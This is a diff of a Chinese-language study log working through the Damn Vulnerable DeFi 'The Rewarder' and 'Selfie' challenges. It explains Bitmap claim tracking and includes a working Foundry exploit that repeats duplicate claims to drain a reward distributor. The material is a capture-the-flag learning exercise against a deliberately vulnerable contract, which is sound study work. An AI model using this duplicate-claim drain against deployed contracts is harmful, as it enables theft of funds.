@@ -1218,8 +1218,8 @@ contract Exploit {
   2. `TheRewarderDistributor` 合約的 WETH 代幣餘額低於 0.001 顆
   3. 上述資產都被轉到 `recovery` 帳號
 - 解法
-  - 這一題的知識背景主要是 Bitmaps
-  - 還有 Merkle Tree
+  - 這一題的知識背景主要是 Bitmap 與 Merkle Tree
+  - 先從 Merkle Tree 的部分開始看
   - 已知 Claimable Leaves 是 `/test/the-rewarder/dvt-distribution.json` 與 `/test/the-rewarder/weth-distribution.json` 紀錄的內容
     - 每個 Leaf 存在 `address` 和可領取的 `amount` 元素
     - `bytes32 leaf = keccak256(abi.encodePacked(address, amount));`
@@ -1230,8 +1230,65 @@ contract Exploit {
   - 我們操縱的錢包，被限制在只能使用 `player`，所以沒辦法直接利用
     - 所以通過 `if (distributions[token].remaining == 0)` 基本上沒可能了，畢竟我們只能 claim `player` 的微量 distributions
   - 在 `createDistribution()` 身上搞事也沒辦法，因為要把 DVT, WETH 偷走，想搞事會遇到 `if (distributions[token].remaining != 0) revert StillDistributing();` 語句
-  - 那麼可以搞事的地方就剩下 `claimRewards()` 了
+  - **那麼可以搞事的地方就剩下 `claimRewards()` 了**
   - 首先好奇的地方是: `claimReward()` 是如何判斷一個錢包地址已經 Claim 過了？有沒有可能存在 Double Claim 的可能性？
+  - `TheRewarderDistributor` 採用了 Bitmap 資料結構來紀錄哪些 `Claim` 已經被 claimed 走了
+  - 用 Bitmap 的好處是可以減少 Storage Slot 的冷存取，增加同一個 32 bytes 記憶體空間的熱存取次數
+    - 因為可以把多個 `Claim` 紀錄，透過 Bitmap 塞在同一個 Storage Slot
+  - 尤其 Bitmap 的特長是在紀錄 Binary 特性的紀錄，例如: 有領過 / 沒有領過
+    - 也就是那些只需要用 1 bit 來紀錄有 or 沒有的資料
+  - 如果說我們使用 `mapping(address => bool)` 來紀錄哪些地址領取過 distribution 會比較浪費空間
+    - 畢竟一個 256 bit 的 storage slot 你只使用了 1 bit
+  - Bitmap 想解決的問題是: **找到某種方法，讓我們可以在一個 256 bit 的 storage slot 塞入 256 個 bool flag**，這樣就不浪費空間了
+  - 具體來說，Bitmap 會需要將你的資料結構做分組
+    - 可以想像成電影場次。
+    - 第一場第n個座位、第二場第n個座位、第三場第n個座位。
+  - 這個分組方式是取商數
+    - 舉例來說，總共有 1000 個人想要排隊進場看電影
+    - 但是每個影廳只能塞 256 人
+    - 那麼第 873 人，就會排在 `873/256 + 1 = 4` 第四場次 (+1 只是為了人類可讀, 因為沒有第零場次這種說法...)
+    - 第 257 人就會排在 `257/256 + 1 = 2` 第二場次
+    - 第 555 人就會排在 `555/256 + 1 = 3` 第三場次
+    - 前 256 人自然就是排在第一場次
+  - bool 資料要放在哪裡，就會是取餘數
+    - 舉例來說，總共有 1000 個人想要排隊進場看電影
+    - 但是每個影廳只能塞 256 人
+    - 那麼第 873 人，就會排在 `873 % 256 = 105` 第四場次第 105 號座位
+    - 第 257 人就會排在 `257 % 256 = 2` 第二場次第 1 號座位
+    - 第 555 人就會排在 `555 % 256 = 43` 第三場次第 43 號座位
+  - 我們將商數的部分叫做 bucket，代表第幾場次
+  - 我們將餘數的部分叫做 bit，代表在這 256 個座位中，坐在第幾號座位
+  - 電腦如何為報到者做畫押簽到呢？取決於實施者，通常透過位元運算符來做到的
+    - 以 `AND` 運算符舉例
+    - 我們去一個只能容納 8 個人的影廳，我的座位號碼是 `5`
+    - 在清場的時候，座位沒人坐，所以座位的狀態是長這樣: `00000000`
+    - 我的座號是 5，從右邊數來，我應該是會坐在 `00010000` 
+    - 電腦如何為我簽到畫押? 當然是**從最右邊向左移 5 個位置**
+    - 寫成程式就是: `uint256 your_position = (1 << bit);` 這邊的 1 代表我這個人的屁股確實坐下去了(?)
+    - 電腦怎麼判斷我有沒有重複報到? 只需要做 `AND` 就可以知道了。
+      - 因為我的屁股的狀態要馬是坐下去了，不然就是還沒坐
+    - 寫成程式就是: `bitmap._data[bucket] & mask) != 0`
+      - 如果是 `== 1` 就代表我重複了相同的狀態 -> 非法狀態 (已經進場了還要再進場一次)
+  - [這一篇文章](https://binschool.org/solidity-demo/solidity-demo-bitmap.html)把 Bitmap 的代碼解釋的蠻好的，推一個
+  - 回到題目程式碼，理解出 Bitmap 分組索引的實施在哪裏
+    - [Claim.batchNumber](https://github.com/theredguild/damn-vulnerable-defi/blob/d22e1075c9687a2feb58438fd37327068d5379c0/src/the-rewarder/TheRewarderDistributor.sol#L19) 是電影院票號 (還沒兌換成進場座位)
+    - [wordPosition](https://github.com/theredguild/damn-vulnerable-defi/blob/d22e1075c9687a2feb58438fd37327068d5379c0/src/the-rewarder/TheRewarderDistributor.sol#L90) 代表第幾場次
+    - [bitPosition](https://github.com/theredguild/damn-vulnerable-defi/blob/d22e1075c9687a2feb58438fd37327068d5379c0/src/the-rewarder/TheRewarderDistributor.sol#L91) 是該場次的座位
+  - `_setClaimed()` 函數主要有兩個作用
+    1. 檢查給入的 `Claim` 物件是否重複 Claim 了，重複就會引發 `revert AlreadyClaimed()`
+    2. 將 `Claim` 物件設置為已領取
+  - [已知有效的 `tokenIndex` 只有 `0` 與 `1` 分別代表 DVT 與 WETH](https://github.com/theredguild/damn-vulnerable-defi/blob/d22e1075c9687a2feb58438fd37327068d5379c0/test/the-rewarder/TheRewarder.t.sol#L96)
+  - `if (token != inputTokens[inputClaim.tokenIndex])` 這組語句我感覺很奇怪，因為首輪迴圈 token 基本上是 `0x00`
+    - 所以應該不管怎麼樣都不太會碰到第一條 `_setClaimed(token, amount, wordPosition, bitsSet)` 才對
+    - 我懷疑是煙霧彈...
+  - 所以應該可以默認 `if (address(token) != address(0))` 應該一定會返回 False 才對
+  - 如果是 False, 接在下面的語句看起來是做好下一輪迴圈 `token` `bitsSet` `amount` 指向第一輪的正常值
+  - 🤔 呃... 最詭異的地方居然是在最後一個 Claim 才呼叫 `_setClaimed()` 嗎...?
+  - 感覺漏洞應該是出在這裡沒錯了，**它只對最後一輪的 bitsSet 做已領取的設置**。
+  - 前面的 Claim 通通都沒有 `_setClaimed()` 到，但是前面的每一個 `inputClaim.amount` 都轉給我們了
+  - 也就是說，我應該可以發起傳入多個相同的 Claim。把合約的 DVT WETH 餘額榨乾
+  - 已知 `alice` 地址的 `Claim` 會在 batch0-index2
+  - 我們可以找到 `player` 地址的 `Claim` 會在 batch0-index189
   - 
 
 ```solidity=
@@ -1240,6 +1297,105 @@ function test_theRewarder() public checkSolvedByPlayer {
 }
 ```
 
+
+```solidity=
+function test_theRewarder() public checkSolvedByPlayer {
+    bytes32[] memory dvtLeaves = _loadRewards("/test/the-rewarder/dvt-distribution.json");
+    bytes32[] memory wethLeaves = _loadRewards("/test/the-rewarder/weth-distribution.json");
+
+    /**
+     * 計算需要重複 Reclaim 多少次才能滿足題目要求
+     *   WETH reclaim 次數 = (distributor持有量) / (player單次可領取量)
+     *   DVT reclaim 次數 = (distributor持有量) / (player單次可領取量)
+     */
+    uint256 DVT_in_distributor = dvt.balanceOf(address(distributor));
+    uint256 WETH_in_distributor = weth.balanceOf(address(distributor));
+    uint256 player_claimable_DVT = 11524763827831882;
+    uint256 player_claimable_WETH = 1171088749244340;
+
+    uint256 total_reclaim_times_DVT = DVT_in_distributor / player_claimable_DVT;
+    uint256 total_reclaim_times_WETH = WETH_in_distributor / player_claimable_WETH;
+    uint256 total_reclaims_times = total_reclaim_times_DVT + total_reclaim_times_WETH;
+        
+    console.log("[Before Attack] dvt.balanceOf(distributor): ", DVT_in_distributor);
+    console.log("[Before Attack] weth.balanceOf(distributor): ", WETH_in_distributor);
+
+    /**
+     * 建構 claimRewards(Claim[] memory inputClaims, IERC20[] memory inputTokens) 的參數
+     */
+    IERC20[] memory inputTokens = new IERC20[](2);
+    inputTokens[0] = IERC20(address(dvt));
+    inputTokens[1] = IERC20(address(weth));
+    
+    Claim[] memory inputClaims = new Claim[](total_reclaims_times);
+
+    for (uint256 i; i < total_reclaims_times; ++i) {
+        if(i < total_reclaim_times_DVT) {
+            inputClaims[i] = Claim({
+                batchNumber: 0,
+                amount: player_claimable_DVT,
+                tokenIndex: 0,
+                proof: merkle.getProof(dvtLeaves, 188) // Player's address is at index 188
+            });
+        } else {
+            inputClaims[i] = Claim({
+                batchNumber: 0,
+                amount: player_claimable_WETH,
+                tokenIndex: 1,
+                proof: merkle.getProof(wethLeaves, 188) // Player's address is at index 188
+            });
+        }
+    }
+    
+    /**
+     * Run exploit
+     */
+    
+    distributor.claimRewards(inputClaims, inputTokens);
+    
+    /**
+     * Check result
+     */
+    DVT_in_distributor = dvt.balanceOf(address(distributor));
+    WETH_in_distributor = weth.balanceOf(address(distributor));
+    console.log("[After Attack] dvt.balanceOf(distributor): ", DVT_in_distributor);
+    console.log("[After Attack] weth.balanceOf(distributor): ", WETH_in_distributor);
+
+    if (DVT_in_distributor > 1e16) {
+        console.log("You shall not pass because to too much DVT in distributor"); // expect not show
+    }
+
+    if (WETH_in_distributor > 1e15) {
+        console.log("You shall not pass because to too much DVT in distributor"); // expect not show
+    }
+
+    /**
+     * Transfer to recovery
+     */
+    dvt.transfer(recovery, dvt.balanceOf(player));
+    weth.transfer(recovery, weth.balanceOf(player));
+}
+```
+
+- [DamnVulnerableDeFi-05-TheRewarder.t.sol](/Writeup/DeletedAccount/DamnVulnerableDeFi-05-TheRewarder.t.sol)
+
+
+### 2024.09.19
+
+- 把 09.18 的題目補完
+
+- 稍微看了一下 DVD-06-Selfie，肉眼掃 Code
+- 目測感覺是要找方法濫用 `SimpleGovernance` 來呼叫 `SelfiePool.emergencyExit()` 函數，把 token 幹走
+- 因為感覺 `flashLoan()` 函數沒什麼地方可以把錢偷走了...transfer走的 token 應該也會在後續的 transferFrom 被拿回來
+- 未看實施細節先猜，過關方式是呼叫 `queueAction()` 函數 pending 一個 proposal 進去
+- 然後再呼叫 `executeAction()` 函數，以 Governance 的身份執行 `SelfiePool.emergencyExit()` 函數
+- 再往深一點的地方看，尋找正確呼叫 `SimpleGovernance.queueAction()` 的方式，發現它需要有一定數量的 voting token 才能 queue 一個 Action
+  - 我猜測這裡應該是要透過 `SelfiePool.flashLoan()` 借一點 voting token 出來
+- 要執行 `SimpleGovernance.executeAction()` 看起來是必須等待 queue 了 Action 之後 2 天嗎...Hmmm
+  - `unchecked{ timeDelta = uint64(block.timestamp) - actionToExecute.proposedAt}` 這一段看起來怪詭異的...
+  - 但感覺...這好像只是為了省 overflow checker 的 gas fee, 實際上也沒看到可以利用的地方呢...
+- 那這樣好像只能手動用 Foundry 作弊，快轉區塊時間 2 天了呢
+- 明天補上 Exploit Code
 
 
 <!-- Content_END -->
